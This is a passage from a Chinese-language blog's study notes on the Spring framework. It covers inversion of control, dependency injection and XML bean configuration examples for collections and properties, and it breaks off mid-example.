    
    <entry>
      <title>spring</title>
      <link href="/2020/09/05/spring/"/>
      <url>/2020/09/05/spring/</url>
      
        <content type="html"><![CDATA[<h3 id="一、Spring启示录-参考动力节点笔记"><a href="#一、Spring启示录-参考动力节点笔记" class="headerlink" title="一、Spring启示录(参考动力节点笔记"></a>一、Spring启示录(参考动力节点笔记</h3><p>)</p><h4 id="1-1-OCP开闭原则"><a href="#1-1-OCP开闭原则" class="headerlink" title="1.1 OCP开闭原则"></a>1.1 OCP开闭原则</h4><p><strong>开闭原则</strong>是这样说的：在软件开发过程中应当对扩展开放，对修改关闭。也就是说，如果在进行功能扩展的时候，添加额外的类是没问题的，但因为功能扩展而修改之前运行正常的程序，这是忌讳的，不被允许的。因为一旦修改之前运行正常的程序，就会导致项目整体要进行全方位的重新测试。这是相当麻烦的过程。导致以上问题的主要原因是：代码和代码之间的耦合度太高。</p><p>OCP原则：对扩展开放，对修改关闭，做到上层不依赖下层。</p><h4 id="1-2-依赖倒置原则DIP"><a href="#1-2-依赖倒置原则DIP" class="headerlink" title="1.2 依赖倒置原则DIP"></a>1.2 依赖倒置原则DIP</h4><p><strong>依赖倒置原则</strong>(Dependence Inversion Principle)，简称DIP，主要倡导面向抽象编程，面向接口编程，不要面向具体编程，让上层不再依赖下层，下面改动了，上面的代码不会受到牵连。这样可以大大降低程序的耦合度，耦合度低了，扩展力就强了，同时代码复用性也会增强。（软件七大开发原则都是在为解耦合服务）<br>这种方式是将对象的创建权/管理权交出去了，不再使用硬编码的方式了。同时也把对象关系的管理权交出去了，也不再使用硬编码的方式了。像这种把对象的创建权交出去，把对象关系的管理权交出去，被称为控制反转。</p><h4 id="1-3-控制反转IoC"><a href="#1-3-控制反转IoC" class="headerlink" title="1.3 控制反转IoC"></a>1.3 控制反转IoC</h4><p><strong>控制反转</strong>（Inversion of Control，缩写为IoC），是面向对象编程中的一种设计思想，可以用来降低代码之间的耦合度，符合依赖倒置原则。<br>控制反转的核心是：将对象的创建权交出去，将对象和对象之间关系的管理权交出去，由第三方容器来负责创建与维护。<br>控制反转常见的实现方式：依赖注入（Dependency Injection，简称DI）<br>通常，依赖注入的实现由包括两种方式：<br>●set方法注入<br>●构造方法注入<br>而Spring框架就是一个实现了IoC思想的框架。<br>IoC可以认为是一种全新的设计模式，但是理论和时间成熟相对较晚，并没有包含在GoF中。（GoF指的是23种设计模式）</p><h3 id="二、Spring概述"><a href="#二、Spring概述" class="headerlink" title="二、Spring概述"></a>二、Spring概述</h3><h4 id="2-1-Spring简介"><a href="#2-1-Spring简介" class="headerlink" title="2.1 Spring简介"></a>2.1 Spring简介</h4><p>Spring是一个<strong>开源框架</strong>，它由Rod Johnson创建。它是为了解决企业应用开发的复杂性而创建的。<br>从简单性、可测试性和松耦合的角度而言，任何Java应用都可以从Spring中受益。<br>Spring是一个<strong>轻量级</strong>的<strong>控制反转(IoC)</strong>和<strong>面向切面(AOP)</strong>的<strong>容器</strong>框架。<br>Spring最初的出现是为了解决EJB臃肿的设计，以及难以测试等问题。<br>Spring为简化开发而生，让程序员<strong>只需关注核心业务</strong>的实现，尽可能的<strong>不再关注非业务</strong>逻辑代码（事务控制，安全日志等）。</p><h4 id="2-2-Spring8大模块"><a href="#2-2-Spring8大模块" class="headerlink" title="2.2 Spring8大模块"></a>2.2 Spring8大模块</h4><p>注意：Spring5版本之后是8个模块。在Spring5中新增了WebFlux模块</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/21376908/1663726169861-b5acb757-17e0-4d3d-a811-400eb7edd1b3.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_29%2Ctext_5Yqo5Yqb6IqC54K5%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10" alt=""></p><p>1.<strong>Spring Core模块</strong></p><p>这是Spring框架最基础的部分，它提供了依赖注入（DependencyInjection）特征来实现容器对Bean的管理。核心容器的主要组件是 BeanFactory，BeanFactory是工厂模式的一个实现，是任何Spring应用的核心。它使用IoC将应用配置和依赖从实际的应用代码中分离出来。</p><p>2.<strong>Spring Context模块</strong></p><p>如果说核心模块中的BeanFactory使Spring成为容器的话，那么上下文模块就是Spring成为框架的原因。</p><p>这个模块扩展了BeanFactory，增加了对国际化（I18N）消息、事件传播、验证的支持。另外提供了许多企业服务，例如电子邮件、JNDI访问、EJB集成、远程以及时序调度（scheduling）服务。也包括了对模版框架例如Velocity和FreeMarker集成的支持</p><p>3.<strong>Spring AOP模块</strong></p><p>Spring在它的AOP模块中提供了对面向切面编程的丰富支持，Spring AOP 模块为基于 Spring 的应用程序中的对象提供了事务管理服务。通过使用 Spring AOP，不用依赖组件，就可以将声明性事务管理集成到应用程序中，可以自定义拦截器、切点、日志等操作。</p><p>4.<strong>Spring DAO模块</strong></p><p>提供了一个JDBC的抽象层和异常层次结构，消除了烦琐的JDBC编码和数据库厂商特有的错误代码解析，用于简化JDBC。</p><p>5.<strong>Spring ORM模块</strong></p><p>Spring提供了ORM模块。Spring并不试图实现它自己的ORM解决方案，而是为几种流行的ORM框架提供了集成方案，包括Hibernate、JDO和iBATIS SQL映射，这些都遵从 Spring 的通用事务和 DAO 异常层次结构。</p><p>6.<strong>Spring Web MVC模块</strong></p><p>Spring为构建Web应用提供了一个功能全面的MVC框架。虽然Spring可以很容易地与其它MVC框架集成，例如Struts，但Spring的MVC框架使用IoC对控制逻辑和业务对象提供了完全的分离。</p><p>7.<strong>Spring WebFlux模块</strong></p><p>Spring Framework 中包含的原始 Web 框架 Spring Web MVC 是专门为 Servlet API 和 Servlet 容器构建的。反应式堆栈 Web 框架 Spring WebFlux 是在 5.0 版的后期添加的。它是完全非阻塞的，支持反应式流(Reactive Stream)背压，并在Netty，Undertow和Servlet 3.1+容器等服务器上运行。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/21376908/1663740062570-1823e8ac-1794-4590-87de-87e4a139a722.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_24%2Ctext_5Yqo5Yqb6IqC54K5%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10%2Fresize%2Cw_830%2Climit_0" alt="image.png"></p><p>8.<strong>Spring Web模块</strong><br>Web 上下文模块建立在应用程序上下文模块之上，为基于 Web 的应用程序提供了上下文，提供了Spring和其它Web框架的集成，比如Struts、WebWork。还提供了一些面向服务支持，例如：实现文件上传的multipart请求。</p><h4 id="2-3-Spring特点"><a href="#2-3-Spring特点" class="headerlink" title="2.3 Spring特点"></a>2.3 Spring特点</h4><p>1.<strong>轻量</strong><br>a.从大小与开销两方面而言Spring都是轻量的。完整的Spring框架可以在一个大小只有1MB多的JAR文件里发布。并且Spring所需的处理开销也是微不足道的。<br>b.Spring是非侵入式的：Spring应用中的对象不依赖于Spring的特定类。<br>2.<strong>控制反转</strong><br>a.Spring通过一种称作控制反转（IoC）的技术促进了松耦合。当应用了IoC，一个对象依赖的其它对象会通过被动的方式传递进来，而不是这个对象自己创建或者查找依赖对象。你可以认为IoC与JNDI相反——不是对象从容器中查找依赖，而是容器在对象初始化时不等对象请求就主动将依赖传递给它。<br>3.<strong>面向切面</strong><br>a.Spring提供了面向切面编程的丰富支持，允许通过分离应用的业务逻辑与系统级服务（例如审计（auditing）和事务（transaction）管理）进行内聚性的开发。应用对象只实现它们应该做的——完成业务逻辑——仅此而已。它们并不负责（甚至是意识）其它的系统级关注点，例如日志或事务支持。<br>4.<strong>容器</strong><br>a.Spring包含并管理应用对象的配置和生命周期，在这个意义上它是一种容器，你可以配置你的每个bean如何被创建——基于一个可配置原型（prototype），你的bean可以创建一个单独的实例或者每次需要时都生成一个新的实例——以及它们是如何相互关联的。然而，Spring不应该被混同于传统的重量级的EJB容器，它们经常是庞大与笨重的，难以使用。<br>5.<strong>框架</strong><br>a.Spring可以将简单的组件配置、组合成为复杂的应用。在Spring中，应用对象被声明式地组合，典型地是在一个XML文件里。Spring也提供了很多基础功能（事务管理、持久化框架集成等等），将应用逻辑的开发留给了你。<br>所有Spring的这些特征使你能够编写更干净、更可管理、并且更易于测试的代码。它们也为Spring中的各种模块提供了基础支持。</p><h3 id="三、Spring的入门程序"><a href="#三、Spring的入门程序" class="headerlink" title="三、Spring的入门程序"></a>三、Spring的入门程序</h3><h4 id="3-1-Spring的下载"><a href="#3-1-Spring的下载" class="headerlink" title="3.1 Spring的下载"></a>3.1 Spring的下载</h4><h4 id="3-2-Spring的jar文件"><a href="#3-2-Spring的jar文件" class="headerlink" title="3.2 Spring的jar文件"></a>3.2 Spring的jar文件</h4><h4 id="3-3-第一个Spring程序"><a href="#3-3-第一个Spring程序" class="headerlink" title="3.3 第一个Spring程序"></a>3.3 第一个Spring程序</h4><h4 id="3-4-第一个Spring程序详细剖析"><a href="#3-4-第一个Spring程序详细剖析" class="headerlink" title="3.4 第一个Spring程序详细剖析"></a>3.4 第一个Spring程序详细剖析</h4><h4 id="3-5-Spring6启用Log4j2日志框架"><a href="#3-5-Spring6启用Log4j2日志框架" class="headerlink" title="3.5 Spring6启用Log4j2日志框架"></a>3.5 Spring6启用Log4j2日志框架</h4><h3 id="四、Spring对IoC的实现"><a href="#四、Spring对IoC的实现" class="headerlink" title="四、Spring对IoC的实现"></a>四、Spring对IoC的实现</h3><h4 id="4-1-IoC-控制反转"><a href="#4-1-IoC-控制反转" class="headerlink" title="4.1 IoC 控制反转"></a>4.1 IoC 控制反转</h4><p>●控制反转是一种思想。<br>●控制反转是为了降低程序耦合度，提高程序扩展力，达到OCP原则，达到DIP原则。<br>●控制反转，反转的是什么？<br>        ○将对象的创建权利交出去，交给第三方容器负责。<br>        ○将对象和对象之间关系的维护权交出去，交给第三方容器负责。<br>●控制反转这种思想如何实现呢？<br>        ○DI（Dependency Injection）：依赖注入</p><h4 id="4-2-依赖注入"><a href="#4-2-依赖注入" class="headerlink" title="4.2 依赖注入"></a>4.2 依赖注入</h4><p>依赖注入实现了控制反转的思想。<br>Spring通过依赖注入的方式来完成Bean管理的。<br>Bean管理说的是：Bean对象的创建，以及Bean对象中属性的赋值（或者叫做Bean对象之间关系的维护）。<br>依赖注入：<br>●依赖指的是对象和对象之间的关联关系。<br>●注入指的是一种数据传递行为，通过注入行为来让对象和对象产生关系。<br>依赖注入常见的实现方式包括两种：<br>●第一种：set注入<br>●第二种：构造注入</p><h5 id="4-2-1-set注入"><a href="#4-2-1-set注入" class="headerlink" title="4.2.1 set注入"></a>4.2.1 set注入</h5><p>set注入，基于set方法实现的，底层会通过反射机制调用属性对应的set方法然后给属性赋值。这种方式要求属性必须对外提供set方法。</p><p>底层实际上调用了setXXX()方法。所以需要确保这个方法的存在。</p><p><strong>总结：set注入的核心实现原理：通过反射机制调用set方法来给属性赋值，让两个对象之间产生关系</strong></p><h5 id="4-2-2-构造注入"><a href="#4-2-2-构造注入" class="headerlink" title="4.2.2 构造注入"></a>4.2.2 构造注入</h5><p>核心原理：通过调用构造方法来给属性赋值。</p><p>通过构造方法注入的时候：<br>●可以通过下标<br>●可以通过参数名<br>●也可以不指定下标和参数名，可以类型自动推断。<br>Spring在装配方面做的还是比较健壮的。</p><h4 id="4-3-set注入专题"><a href="#4-3-set注入专题" class="headerlink" title="4.3 set注入专题"></a>4.3 set注入专题</h4><h5 id="4-3-1-注入外部Bean"><a href="#4-3-1-注入外部Bean" class="headerlink" title="4.3.1 注入外部Bean"></a>4.3.1 注入外部Bean</h5><p>外部Bean的特点：bean定义到外面，在property标签中使用ref属性进行注入。通常这种方式是常用。</p><pre class=" language-xml"><code class="language-xml">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userDaoBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.dao.UserDao<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userServiceBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.service.UserService<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userDaoBean<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><h5 id="4-3-2-注入内部Bean"><a href="#4-3-2-注入内部Bean" class="headerlink" title="4.3.2 注入内部Bean"></a>4.3.2 注入内部Bean</h5><p>内部Bean的方式：在bean标签中嵌套bean标签。</p><pre class=" language-xml"><code class="language-xml">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userServiceBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.service.UserService<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.dao.UserDao<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><h5 id="4-3-3-注入简单类型"><a href="#4-3-3-注入简单类型" class="headerlink" title="4.3.3 注入简单类型"></a>4.3.3 注入简单类型</h5><p>需要特别注意：如果给简单类型赋值，使用value属性或value标签。而不是ref。</p><p>通过源码分析得知，简单类型包括：<br>●基本数据类型<br>●基本数据类型对应的包装类<br>●String或其他的CharSequence子类<br>●Number子类<br>●Date子类<br>●Enum子类<br>●URI<br>●URL<br>●Temporal子类<br>●Locale<br>●Class<br>●另外还包括以上简单值类型对应的数组类型。</p><p>需要注意的是：</p><p>●如果把Date当做简单类型的话，<strong>日期字符串格式不能随便写</strong>。格式必须符合Date的toString()方法格式。显然这就比较鸡肋了。如果我们提供一个这样的日期字符串：2010-10-11，在这里是无法赋值给Date类型的属性的。</p><p>●spring6之后，当注入的是<strong>URL</strong>，那么这个url字符串是会<strong>进行有效性检测</strong>的。如果是一个存在的url，那就没问题。如果不存在则报错。</p><h5 id="4-3-4-级联属性赋值（了解）"><a href="#4-3-4-级联属性赋值（了解）" class="headerlink" title="4.3.4 级联属性赋值（了解）"></a>4.3.4 级联属性赋值（了解）</h5><pre class=" language-xml"><code class="language-xml">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>clazzBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.beans.Clazz<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>student<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.beans.Student<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>张三<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token comment" spellcheck="true">&lt;!--要点1：以下两行配置的顺序不能颠倒--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>clazz<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>clazzBean<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token comment" spellcheck="true">&lt;!--要点2：clazz属性必须有getter方法--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>clazz.name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>高三一班<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><h5 id="4-3-5-注入数组"><a href="#4-3-5-注入数组" class="headerlink" title="4.3.5 注入数组"></a>4.3.5 注入数组</h5><pre class=" language-xml"><code class="language-xml">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>person<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.beans.Person<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>favariteFoods<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>鸡排<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>汉堡<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>鹅肝<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><h5 id="4-3-6-注入List集合"><a href="#4-3-6-注入List集合" class="headerlink" title="4.3.6 注入List集合"></a>4.3.6 注入List集合</h5><pre class=" language-xml"><code class="language-xml">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>peopleBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.beans.People<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>names<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>铁锤<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>张三<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>张三<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>张三<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>狼<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><h5 id="4-3-7-注入Set集合"><a href="#4-3-7-注入Set集合" class="headerlink" title="4.3.7 注入Set集合"></a>4.3.7 注入Set集合</h5><pre class=" language-xml"><code class="language-xml">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>peopleBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.beans.People<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>phones<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>set</span><span class="token punctuation">></span></span>                <span class="token comment" spellcheck="true">&lt;!--非简单类型可以使用ref，简单类型使用value--></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>110<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>110<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>120<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>120<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>119<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>119<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>set</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><p>要点：<br>●使用<set>标签<br>●set集合中元素是简单类型的使用value标签，反之使用ref标签。</p><h5 id="4-3-8-注入Map集合"><a href="#4-3-8-注入Map集合" class="headerlink" title="4.3.8 注入Map集合"></a>4.3.8 注入Map集合</h5><pre class=" language-xml"><code class="language-xml">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>peopleBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.beans.People<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>addrs<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>map</span><span class="token punctuation">></span></span>                <span class="token comment" spellcheck="true">&lt;!--如果key不是简单类型，使用 key-ref 属性--></span>                <span class="token comment" spellcheck="true">&lt;!--如果value不是简单类型，使用 value-ref 属性--></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entry</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>北京大兴区<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entry</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>上海浦东区<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entry</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>深圳宝安区<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>map</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><p>要点：<br>●使用<map>标签<br>●如果key是简单类型，使用 key 属性，反之使用 key-ref 属性。<br>●如果value是简单类型，使用 value 属性，反之使用 value-ref 属性。</p><h5 id="4-3-9-注入Properties"><a href="#4-3-9-注入Properties" class="headerlink" title="4.3.9 注入Properties"></a>4.3.9 注入Properties</h5><p>java.util.Properties继承java.util.Hashtable，所以Properties也是一个Map集合。</p><pre class=" language-java"><code class="language-java">    <span class="token keyword">private</span> Properties properties<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setProperties</span><span class="token punctuation">(</span>Properties properties<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>properties <span class="token operator">=</span> properties<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><pre class=" language-xml"><code class="language-xml">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>peopleBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.beans.People<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>properties<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>props</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>driver<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>com.mysql.cj.jdbc.Driver<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>jdbc:mysql://localhost:3306/spring<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token 